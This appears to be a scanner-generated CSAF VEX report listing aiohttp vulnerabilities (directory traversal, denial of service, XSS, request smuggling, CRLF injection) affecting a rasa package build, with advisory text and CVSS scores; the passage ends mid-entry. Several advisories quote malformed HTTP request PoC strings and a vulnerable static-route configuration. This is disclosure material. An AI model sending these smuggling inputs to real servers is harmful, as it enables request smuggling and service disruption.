{"document":{"aggregate_severity":{"text":"Critical"},"category":"csaf_vex","csaf_version":"2.0","lang":"en","notes":[{"category":"legal_disclaimer","text":"Depscan reachable code only covers the project source code, not the code of dependencies. A dependency may execute vulnerable code when called even if it is not in the project's source code. Regard the Depscan-set flag of 'code_not_in_execute_path' with this in mind."}],"publisher":{"category":"vendor","contact_details":"vendor@mcvendorson.com","name":"Vendor McVendorson","namespace":"https://appthreat.com"},"title":"Your Title","tracking":{"current_release_date":"2024-09-27T05:14:19","id":"2024-09-27T05:14:19_v1","initial_release_date":"2024-09-27T05:14:19","revision_history":[],"status":"draft","version":"1"}},"product_tree":{"full_product_names":[{"name":"rasa","product_id":"rasa:3.7.0a1","product_identification_helper":{"purl":"pkg:pypi/rasa@3.7.0a1"}}]},"vulnerabilities":[{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-23334"]}],"cve":"CVE-2024-23334","cwe":{"id":"22","name":"Improper Limitation of a Pathname to a Restricted Directory"},"discovery_date":"2024-01-29T22:31:03","ids":[{"system_name":"CVE Record","text":"CVE-2024-23334"},{"system_name":"GitHub Advisory","text":"GHSA-5h86-8mv2-jq9f"},{"system_name":"GitHub Advisory","text":"PYSEC-2024-24"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp is vulnerable to directory traversal"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp is vulnerable to directory traversal ### Summary Improperly configuring static resource resolution in aiohttp when used as a web server can result in the unauthorized reading of arbitrary files on the system.  ### Details When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.  i.e. An application is only vulnerable with setup code like: ``` app.router.add_routes([   web.static(\"/static\", \"static/\", follow_symlinks=True), # Remove follow_symlinks to avoid the vulnerability ]) ```  ### Impact This is a directory traversal vulnerability with CWE ID 22. When using aiohttp as a web server and enabling static resource resolution with `follow_symlinks` set to True, it can lead to this vulnerability. This vulnerability has been present since the introduction of the `follow_symlinks` parameter.  ### Workaround Even if upgrading to a patched version of aiohttp, we recommend following these steps regardless.  If using `follow_symlinks=True` outside of a restricted local development environment, disable the option immediately. This option is NOT needed to follow symlinks which point to a location _within_ the static root directory, it is _only_ intended to allow a symlink to break out of the static directory. Even with this CVE fixed, there is still a substantial risk of misconfiguration when using this option on a server that accepts requests from remote users.  Additionally, aiohttp has always recommended using a reverse proxy server (such as nginx) to handle static resources and _not_ to use these static resources in aiohttp for production environments. Doing so also protects against this vulnerability, and is why we expect the number of affected users to be very low.  -----  Patch: https://github.com/aio-libs/aiohttp/pull/8079/files  ## Related CVE(s) CVE-2024-23334, PYSEC-2024-24"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=1.0.5|<3.9.2"],"known_not_affected":["aiohttp@3.9.2"]},"references":[{"summary":"GitHub Advisory GHSA-5h86-8mv2-jq9f","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f"},{"summary":"GitHub Advisory PYSEC-2024-24","url":"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2024-24.yaml"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ICUOCFGTB25WUT336BZ4UNYLSZOUVKBD"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XXWVZIVAYWEBHNRIILZVB3R3SDQNNAA7"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-23334"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-23334"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":5.9,"baseSeverity":"MEDIUM","confidentialityImpact":"HIGH","environmentalScore":5.9,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.9,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N","version":"3.1"},"products":["aiohttp@vers:pypi/>=1.0.5|<3.9.2"]}],"title":"CVE-2024-23334/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-30251"]}],"cve":"CVE-2024-30251","cwe":{"id":"835","name":"Loop with Unreachable Exit Condition"},"discovery_date":"2024-05-03T17:29:54","ids":[{"system_name":"CVE Record","text":"CVE-2024-30251"},{"system_name":"GitHub Advisory","text":"GHSA-5m98-qgg9-wh84"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp vulnerable to Denial of Service when trying to parse malformed POST requests"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp vulnerable to Denial of Service when trying to parse malformed POST requests ### Summary An attacker can send a specially crafted POST (multipart/form-data) request. When the aiohttp server processes it, the server will enter an infinite loop and be unable to process any further requests.  ### Impact An attacker can stop the application from serving requests after sending a single request.  -------  For anyone needing to patch older versions of aiohttp, the minimum diff needed to resolve the issue is (located in `_read_chunk_from_length()`):  ```diff diff --git a/aiohttp/multipart.py b/aiohttp/multipart.py index 227be605c..71fc2654a 100644 --- a/aiohttp/multipart.py +++ b/aiohttp/multipart.py @@ -338,6 +338,8 @@ class BodyPartReader:      assert self._length is not None, \"Content-Length required for chunked read\"      chunk_size = min(size, self._length - self._read_bytes)      chunk = await self._content.read(chunk_size) +    if self._content.at_eof(): +      self._at_eof = True      return chunk      async def _read_chunk_from_stream(self, size: int) -> bytes: ```  This does however introduce some very minor issues with handling form data. So, if possible, it would be recommended to also backport the changes in: https://github.com/aio-libs/aiohttp/commit/cebe526b9c34dc3a3da9140409db63014bc4cf19 https://github.com/aio-libs/aiohttp/commit/7eecdff163ccf029fbb1ddc9de4169d4aaeb6597 https://github.com/aio-libs/aiohttp/commit/f21c6f2ca512a026ce7f0f6c6311f62d6a638866"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.9.4rc0"]},"references":[{"summary":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/05/02/4"},{"summary":"GitHub Advisory GHSA-5m98-qgg9-wh84","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5m98-qgg9-wh84"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-30251"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-30251"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"NONE","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.9.4rc0"]}],"title":"CVE-2024-30251/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-27306"]}],"cve":"CVE-2024-27306","cwe":{"id":"79","name":"Improper Neutralization of Input During Web Page Generation"},"discovery_date":"2024-04-18T13:45:21","ids":[{"system_name":"CVE Record","text":"CVE-2024-27306"},{"system_name":"GitHub Advisory","text":"GHSA-7gpw-8wmc-pm8g"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp Cross-site Scripting vulnerability on index pages for static file handling"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp Cross-site Scripting vulnerability on index pages for static file handling ### Summary  A XSS vulnerability exists on index pages for static file handling.  ### Details  When using `web.static(..., show_index=True)`, the resulting index pages do not escape file names.  If users can upload files with arbitrary filenames to the static directory, the server is vulnerable to XSS attacks.  ### Workaround  We have always recommended using a reverse proxy server (e.g. nginx) for serving static files. Users following the recommendation are unaffected.  Other users can disable `show_index` if unable to upgrade.  -----  Patch: https://github.com/aio-libs/aiohttp/pull/8319/files"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.9.4rc0"]},"references":[{"summary":"GitHub Advisory GHSA-7gpw-8wmc-pm8g","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-7gpw-8wmc-pm8g"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2EXRGTN2WG7VZLUZ7WOXU5GQJKCPPHKP"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NWEI6NIHZ3G7DURDZVMRK7ZEFC2BTD3U"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZIVBMPEY7WWOFMC3CWXFBRQPFECV4SW3"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-27306"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-27306"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":6.1,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":6.1,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"CHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"CHANGED","temporalScore":6.1,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.9.4rc0"]}],"title":"CVE-2024-27306/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-23829"]}],"cve":"CVE-2024-23829","cwe":{"id":"444","name":"Inconsistent Interpretation of HTTP Requests"},"discovery_date":"2024-01-29T22:30:07","ids":[{"system_name":"CVE Record","text":"CVE-2024-23829"},{"system_name":"GitHub Advisory","text":"GHSA-8qpw-xqxj-h4r2"},{"system_name":"GitHub Advisory","text":"GHSA-gfw2-4jvh-wgfg"},{"system_name":"GitHub Advisory","text":"PYSEC-2024-26"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp's HTTP parser (the python one, not llhttp) still overly lenient about separators"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp's HTTP parser (the python one, not llhttp) still overly lenient about separators ### Summary Security-sensitive parts of the *Python HTTP parser* retained minor differences in allowable character sets, that must trigger error handling to robustly match frame boundaries of proxies in order to protect against injection of additional requests. Additionally, validation could trigger exceptions that were not handled consistently with processing of other malformed input.  ### Details These problems are rooted in pattern matching protocol elements, previously improved by PR #3235 and GHSA-gfw2-4jvh-wgfg:  1. The expression `HTTP/(\\d).(\\d)` lacked another backslash to clarify that the separator should be a literal dot, not just *any* Unicode code point (result: `HTTP/(\\d)\\.(\\d)`).  2. The HTTP version was permitting Unicode digits, where only ASCII digits are standards-compliant.  3. Distinct regular expressions for validating HTTP Method and Header field names were used - though both should (at least) apply the common restrictions of rfc9110 `token`.  ### PoC `GET / HTTP/1ö1` `GET / HTTP/1.𝟙` `GET/: HTTP/1.1` `Content-Encoding?: chunked`  ### Impact Primarily concerns running an aiohttp server without llhttp:  1. **behind a proxy**: Being more lenient than internet standards require could, depending on deployment environment, assist in request smuggling.  2. **directly accessible** or exposed behind proxies relaying malformed input: the unhandled exception could cause excessive resource consumption on the application server and/or its logging facilities.  -----  Patch: https://github.com/aio-libs/aiohttp/pull/8074/files  ## Related CVE(s) CVE-2024-23829, PYSEC-2024-26"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.9.1"]},"references":[{"summary":"GitHub Advisory GHSA-8qpw-xqxj-h4r2","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-8qpw-xqxj-h4r2"},{"summary":"GitHub Advisory GHSA-gfw2-4jvh-wgfg","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg"},{"summary":"GitHub Advisory PYSEC-2024-26","url":"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2024-26.yaml"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ICUOCFGTB25WUT336BZ4UNYLSZOUVKBD"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XXWVZIVAYWEBHNRIILZVB3R3SDQNNAA7"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-23829"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-23829"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"LOW","baseScore":6.5,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":6.5,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":6.5,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.9.1"]}],"title":"CVE-2024-23829/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-47627"]}],"cve":"CVE-2023-47627","cwe":{"id":"444","name":"Inconsistent Interpretation of HTTP Requests"},"discovery_date":"2023-11-14T22:20:59","ids":[{"system_name":"CVE Record","text":"CVE-2023-47627"},{"system_name":"GitHub Advisory","text":"GHSA-gfw2-4jvh-wgfg"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-246"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"AIOHTTP has problems in HTTP parser (the python one, not llhttp)"},{"category":"details","details":"Vulnerability Details","text":"# AIOHTTP has problems in HTTP parser (the python one, not llhttp) # Summary The HTTP parser in AIOHTTP has numerous problems with header parsing, which could lead to request smuggling. This parser is only used when `AIOHTTP_NO_EXTENSIONS` is enabled (or not using a prebuilt wheel).   # Details  ## Bug 1: Bad parsing of `Content-Length` values  ### Description RFC 9110 says this: > `Content-Length = 1*DIGIT`  AIOHTTP does not enforce this rule, presumably because of an incorrect usage of the builtin `int` constructor. Because the `int` constructor accepts `+` and `-` prefixes, and digit-separating underscores, using `int` to parse CL values leads AIOHTTP to significant misinterpretation.  ### Examples ``` GET / HTTP/1.1   Content-Length: -0      X ``` ``` GET / HTTP/1.1   Content-Length: +0_1      X ```  ### Suggested action Verify that a `Content-Length` value consists only of ASCII digits before parsing, as the standard requires.  ## Bug 2: Improper handling of NUL, CR, and LF in header values  ### Description RFC 9110 says this: > Field values containing CR, LF, or NUL characters are invalid and dangerous, due to the varying ways that implementations might parse and interpret those characters; a recipient of CR, LF, or NUL within a field value MUST either reject the message or replace each of those characters with SP before further processing or forwarding of that message.  AIOHTTP's HTTP parser does not enforce this rule, and will happily process header values containing these three forbidden characters without replacing them with SP. ### Examples ``` GET / HTTP/1.1   Header: v\\x00alue      ``` ``` GET / HTTP/1.1   Header: v alue      ``` ``` GET / HTTP/1.1   Header: v alue      ``` ### Suggested action Reject all messages with NUL, CR, or LF in a header value. The translation to space thing, while technically allowed, does not seem like a good idea to me.  ## Bug 3: Improper stripping of whitespace before colon in HTTP headers  ### Description RFC 9112 says this: > No whitespace is allowed between the field name and colon. In the past, differences in the handling of such whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject, with a response status code of 400 (Bad Request), any received request message that contains whitespace between a header field name and colon.  AIOHTTP does not enforce this rule, and will simply strip any whitespace before the colon in an HTTP header.  ### Example ``` GET / HTTP/1.1   Content-Length : 1      X ```  ### Suggested action Reject all messages with whitespace before a colon in a header field, as the standard requires.  # PoC Example requests are embedded in the previous section. To reproduce these bugs, start an AIOHTTP server without llhttp (i.e. `AIOHTTP_NO_EXTENSIONS=1`) and send the requests given in the previous section. (e.g. by `printf`ing into `nc`)  # Impact Each of these bugs can be used for request smuggling.  ## Related CVE(s) CVE-2023-47627, PYSEC-2023-246"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.8.5"]},"references":[{"summary":"GitHub Advisory GHSA-gfw2-4jvh-wgfg","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg"},{"summary":"GitHub Advisory PYSEC-2023-246","url":"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-246.yaml"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FUSJVQ7OQ55RWL4XAX2F5EZ73N4ZSH6U"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VDKQ6HM3KNDU4OQI476ZWT4O7DMSIT35"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WQYQL6WV535EEKSNH7KRARLLMOW5WXDM"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-47627"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-47627"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":5.3,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.3,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.3,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.8.5"]}],"title":"CVE-2023-47627/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-42367"]}],"cve":"CVE-2024-42367","cwe":{"id":"61","name":"UNIX Symbolic Link"},"discovery_date":"2024-08-09T16:49:58","ids":[{"system_name":"CVE Record","text":"CVE-2024-42367"},{"system_name":"GitHub Advisory","text":"GHSA-jwhx-xcg6-8xhj"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"In aiohttp, compressed files as symlinks are not protected from path traversal"},{"category":"details","details":"Vulnerability Details","text":"# In aiohttp, compressed files as symlinks are not protected from path traversal ### Summary Static routes which contain files with compressed variants (`.gz` or `.br` extension) were vulnerable to path traversal outside the root directory if those variants are symbolic links.  ### Details The server protects static routes from path traversal outside the root directory when `follow_symlinks=False` (default). It does this by resolving the requested URL to an absolute path and then checking that path relative to the root. However, these checks are not performed when looking for compressed variants in the `FileResponse` class, and symbolic links are then automatically followed when performing `Path.stat()` and `Path.open()` to send the file.  ### Impact Servers with static routes that contain compressed variants as symbolic links, pointing outside the root directory, or that permit users to upload or create such links, are impacted.  ----  Patch: https://github.com/aio-libs/aiohttp/pull/8653/files"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.9.5"]},"references":[{"summary":"GitHub Advisory GHSA-jwhx-xcg6-8xhj","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jwhx-xcg6-8xhj"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-42367"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-42367"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":4.8,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":4.8,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":4.8,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.9.5"]}],"title":"CVE-2024-42367/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"GitHub","urls":["https://github.com/aio-libs/aiohttp/security/advisories/GHSA-pjjw-qhg8-p2p9"]}],"cwe":{"id":"444","name":"Inconsistent Interpretation of HTTP Requests"},"discovery_date":"2023-11-27T23:15:38","ids":[{"system_name":"GitHub Advisory","text":"GHSA-pjjw-qhg8-p2p9"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp has vulnerable dependency that is vulnerable to request smuggling"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp has vulnerable dependency that is vulnerable to request smuggling ### Summary llhttp 8.1.1 is vulnerable to two request smuggling vulnerabilities. Details have not been disclosed yet, so refer to llhttp for future information. The issue is resolved by using llhttp 9+ (which is included in aiohttp 3.8.6+)."}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.8.5"]},"references":[{"summary":"GitHub Advisory GHSA-pjjw-qhg8-p2p9","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-pjjw-qhg8-p2p9"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"LOW","baseScore":5.0,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":5.0,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.0,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.8.5"]}],"title":"GHSA-pjjw-qhg8-p2p9/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-49081"]}],"cve":"CVE-2023-49081","cwe":{"id":"20","name":"Improper Input Validation"},"discovery_date":"2023-11-27T23:17:42","ids":[{"system_name":"CVE Record","text":"CVE-2023-49081"},{"system_name":"GitHub Advisory","text":"GHSA-q3qx-c6g2-7pw2"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-250"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp's ClientSession is vulnerable to CRLF injection via version"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp's ClientSession is vulnerable to CRLF injection via version ### Summary Improper validation make it possible for an attacker to modify the HTTP request (e.g. to insert a new header) or even create a new HTTP request if the attacker controls the HTTP version.  ### Details The vulnerability only occurs if the attacker can control the HTTP version of the request (including its type). For example if an unvalidated JSON value is used as a version and the attacker is then able to pass an array as the `version` parameter. Furthermore, the vulnerability only occurs when the `Connection` header is passed to the `headers` parameter.  At this point, the library will use the parsed value to create the request. If a list is passed, then it bypasses validation and it is possible to perform CRLF injection.  ### PoC The POC below shows an example of providing an unvalidated array as a version: https://gist.github.com/jnovikov/184afb593d9c2114d77f508e0ccd508e  ### Impact CRLF injection leading to Request Smuggling.  ### Workaround If these specific conditions are met and you are unable to upgrade, then validate the user input to the `version` parameter to ensure it is a `str`.  Patch: https://github.com/aio-libs/aiohttp/pull/7835/files  ## Related CVE(s) CVE-2023-49081, PYSEC-2023-250"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.9.0rc0"]},"references":[{"summary":"GitHub Advisory GHSA-q3qx-c6g2-7pw2","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-q3qx-c6g2-7pw2"},{"summary":"GitHub Advisory PYSEC-2023-250","url":"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-250.yaml"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TY5SI6NK5243DEEDQUFKQKW5GQNKQUMA"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WSYWMP64ZFCTC3VO6RY6EC6VSSMV6I3A"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-49081"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-49081"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":7.2,"baseSeverity":"HIGH","confidentialityImpact":"LOW","environmentalScore":7.2,"environmentalSeverity":"HIGH","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"CHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"CHANGED","temporalScore":7.2,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.9.0rc0"]}],"title":"CVE-2023-49081/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-49082"]}],"cve":"CVE-2023-49082","cwe":{"id":"20","name":"Improper Input Validation"},"discovery_date":"2023-11-27T23:17:24","ids":[{"system_name":"CVE Record","text":"CVE-2023-49082"},{"system_name":"GitHub Advisory","text":"GHSA-qvrw-v9rv-5rjx"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-251"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"aiohttp's ClientSession is vulnerable to CRLF injection via method"},{"category":"details","details":"Vulnerability Details","text":"# aiohttp's ClientSession is vulnerable to CRLF injection via method ### Summary Improper validation makes it possible for an attacker to modify the HTTP request (e.g. insert a new header) or even create a new HTTP request if the attacker controls the HTTP method.  ### Details The vulnerability occurs only if the attacker can control the HTTP method (GET, POST etc.) of the request.  Previous releases performed no validation on the provided value. If an attacker controls the HTTP method it will be used as is and can lead to HTTP request smuggling.  ### PoC A minimal example can be found here: https://gist.github.com/jnovikov/7f411ae9fe6a9a7804cf162a3bdbb44b  ### Impact If the attacker can control the HTTP version of the request it will be able to modify the request (request smuggling).  ### Workaround If unable to upgrade and using user-provided values for the request method, perform manual validation of the user value (e.g. by restricting it to a few known values like GET, POST etc.).  Patch: https://github.com/aio-libs/aiohttp/pull/7806/files  ## Related CVE(s) CVE-2023-49082, PYSEC-2023-251"}],"product_status":{"known_affected":["aiohttp@vers:pypi/>=0.1|<=3.9.0rc0"]},"references":[{"summary":"GitHub Advisory GHSA-qvrw-v9rv-5rjx","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-qvrw-v9rv-5rjx"},{"summary":"GitHub Advisory PYSEC-2023-251","url":"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-251.yaml"},{"summary":"Fedora Project Mailing List 